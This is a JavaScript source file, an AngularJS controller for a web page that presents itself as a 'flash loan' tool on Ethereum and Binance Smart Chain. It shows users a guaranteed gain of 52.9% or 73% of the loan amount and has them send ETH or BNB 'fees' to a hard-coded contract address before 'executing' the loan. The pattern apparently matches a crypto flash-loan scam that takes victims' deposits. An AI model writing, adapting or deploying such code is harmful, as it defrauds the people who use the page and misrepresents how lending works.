const app = angular.module('myApp', []);
app.controller('myCtrl', async function($scope) {
	$scope.init = function() {
		$scope.contractAddress = '';
		$scope.processing = false;
		$scope.ethDeposited = false;
		$scope.formStep = 1;
		$scope.currency = 'ETH';
		$scope.dex = 'Uniswap';
		
		$scope.erc20 = {
			name: '',
			symbol: '',
			network: !isBnb
		};
		$scope.loan = {
			amount: 25,
			tokenFee: 0.01,
			swapFee: 0,
			totalFee: 0,
			gain: 0
		};

		$scope.submitErc20Form = function() {
			const tokenName = $scope.erc20.name.trim();
			if (tokenName == '') return alert('Token Name cannot be blank');
			if (!tokenName.match(/^[a-zA-Z\s]+$/)) return alert('Token Name can only contain letters and spaces');

			const tokenSymbol = $scope.erc20.symbol.trim();
			if (tokenSymbol == '') return alert('Token Symbol cannot be blank');
			if (!tokenSymbol.match(/^[a-zA-Z]+$/)) return alert('Token Symbol can only contain letters');

			if (window.isBnb && $scope.erc20.network) {
				return alert('Network Mismatch. Set MetaMask network to Ethereum and reload the page.');
			} else if (!window.isBnb && !$scope.erc20.network) {
				return alert('Network Mismatch. Set MetaMask network to Binance Smart Chain and the reload page.');
			}

			$scope.formStep = 2;
			$scope.currency = $scope.erc20.network ? 'ETH' : 'BNB';
			$scope.dex = $scope.erc20.network ? 'Uniswap' : 'PancakeSwap';
			$scope.loan.tokenFee = $scope.erc20.network ? 0.01 : 0.02;
			$scope.contractAddress = $scope.erc20.network ? ethAddress : bnbAddress;

			$scope.getLoanEstimates();

			setTimeout(function() {
				document.getElementById('loanAmtInput').focus();
			}, 100);
		}

		$scope.amountChanged = function() {
			$scope.getLoanEstimates();
		}

		$scope.getLoanEstimates = function() {
			if ($scope.loan.amount == undefined || $scope.loan.amount == null) return;
			
			$scope.loan.swapFee =  $scope.loan.amount / ($scope.erc20.network ? 500 : 200);
			$scope.loan.totalFee = fixNumber($scope.loan.tokenFee + $scope.loan.swapFee);

			$scope.loan.gain = fixNumber($scope.loan.amount * ($scope.erc20.network ? 0.529 : 0.73));
		}

		$scope.getLoanEstimates();

		$scope.submitLoanForm = function() {
			if (!$scope.ethDeposited) $scope.depositEth();
			else $scope.executeLoan();
		}

		$scope.depositEth = function() {
			$scope.processing = true;

			window.web3.eth.sendTransaction({
				to: $scope.contractAddress,
				from: $scope.account.address,
				value: window.web3.utils.toWei(''+$scope.loan.totalFee, 'ether'),
				gas: 30000,
				gasPrice: window.web3.utils.toWei('90', 'gwei')
			}, function(error, receipt) {
				$scope.processing = false;
				$scope.$apply();

				if (error) alert('Transaction Failed');
				else {
					setTimeout(function() {
						alert('Money deposited to contract. You can execute the Flash Loan now.');
					}, 5000);
					
					$scope.ethDeposited = true;
					$scope.$apply();
				}
			});
		}

		$scope.executeLoan = function() {
			$scope.processing = true;

			window.contract.methods.action().send({
				to: $scope.contractAddress,
				from: $scope.account.address,
				value: 0,
				gasPrice: window.web3.utils.toWei('90', 'gwei')
			}, function(error, result) {
				if (error) {
					alert('Flash Loan Execution Failed');
					$scope.processing = false;
					$scope.$apply();
				}

				else {
					setTimeout(function() {
						alert('Transaction Successful. Check your wallet!');
					}, 5000);
				}
			});
		}
	}

	await loadWeb3().then(accounts => {
		$scope.account = {
			address: accounts[0]
		};

		$scope.init();
		$scope.$apply();
	});
});

function fixNumber(n) {
	return Math.round((n) * 1e12) / 1e12;
}
